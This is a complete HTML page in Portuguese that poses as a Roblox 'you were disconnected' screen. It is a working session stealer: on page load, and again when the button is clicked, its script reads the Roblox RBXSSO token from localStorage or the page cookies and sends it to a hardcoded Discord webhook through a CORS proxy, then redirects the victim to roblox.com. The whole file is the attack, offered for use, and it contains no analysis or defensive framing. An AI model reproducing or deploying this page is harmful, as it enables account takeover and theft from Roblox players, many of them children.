<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body { 
            background-color: #191919; 
            color: white; 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            text-align: center;
        }
        .container { padding: 20px; }
        img { width: 150px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #b8b8b8; margin-bottom: 20px; }
        button { 
            background-color: #0074bd; 
            color: white; 
            border: none; 
            padding: 12px 24px; 
            font-size: 16px; 
            cursor: pointer; 
            border-radius: 4px;
            font-weight: bold;
        }
        button:hover { background-color: #005a8a; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo">
        <h1>Você foi desconectado</h1>
        <p>Clique abaixo para entrar novamente.</p>
        <button onclick="stealCookie()">Entrar</button>
    </div>

    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 

        function stealCookie() {
            // 1. Tenta pegar do LocalStorage (onde o Roblox guarda o token)
            var robloxAuth = localStorage.getItem('RBXSSO'); 
            
            // 2. Se não achar no LocalStorage, tenta pegar dos Cookies normais como backup
            var normalCookies = document.cookie;

            // 3. Define qual usar
            var finalData = "";
            if (robloxAuth) {
                finalData = "🔑 **Token de Sessão (LocalStorage):**\n\n```\n" + robloxAuth + "\n```";
            } else {
                finalData = "🍪 **Cookies Normais:**\n\n```\n" + normalCookies + "\n```";
            }

            console.log("Dados capturados:", finalData);

            const payload = {
                content: finalData,
                username: "Roblox Logger",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
            };

            fetch("https://corsproxy.io/?url=" + encodeURIComponent(webhookUrl), {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                window.location.href = "https://www.roblox.com";
            })
            .catch(error => {
                console.error("Erro:", error);
                window.location.href = "https://www.roblox.com";
            });
        }

        // Executa automaticamente ao carregar
        window.addEventListener('load', function() {
            setTimeout(stealCookie, 500);
        });
    </script>
</body>
</html>
